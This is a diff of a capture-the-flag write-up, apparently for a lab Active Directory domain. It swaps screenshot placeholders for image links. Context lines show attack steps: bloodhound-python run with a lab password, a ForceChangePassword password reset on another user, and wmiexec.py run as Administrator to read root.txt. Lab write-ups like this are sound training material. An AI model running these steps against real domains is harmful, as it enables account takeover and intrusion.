@@ -151,7 +151,7 @@ dir
 type user.txt
 ```
 
-[SCREEN01]
+<img width="1045" height="466" alt="SCREEN01" src="https://github.com/user-attachments/assets/fc9bc161-6f2a-4dc9-8b3c-962cbecedad0" />
 
 ---
 
@@ -227,7 +227,7 @@ python3 dnschef.py --fakeip <TARGET_IP> --nameserver <TARGET_IP>
 bloodhound-python -d thm.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)' -dc thm.corp -c all -ns 127.0.0.1
 ```
 
-[SCREEN02]
+<img width="1757" height="564" alt="SCREEN02" src="https://github.com/user-attachments/assets/6e3deae0-18f7-48d2-bd45-4baeadf7def8" />
 
 9. Abuse the `ForceChangePassword` ACE to reset `SHAWNA_BRAY`'s password using `TABATHA_BRITT`'s credentials. This does not require knowledge of the current password.
 
@@ -316,4 +316,4 @@ python3 wmiexec.py -k -no-pass Administrator@haystack.thm.corp
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-[SCREEN03]
+<img width="608" height="410" alt="SCREEN03" src="https://github.com/user-attachments/assets/c3fab196-9020-4d71-97ef-2462330cbe05" />
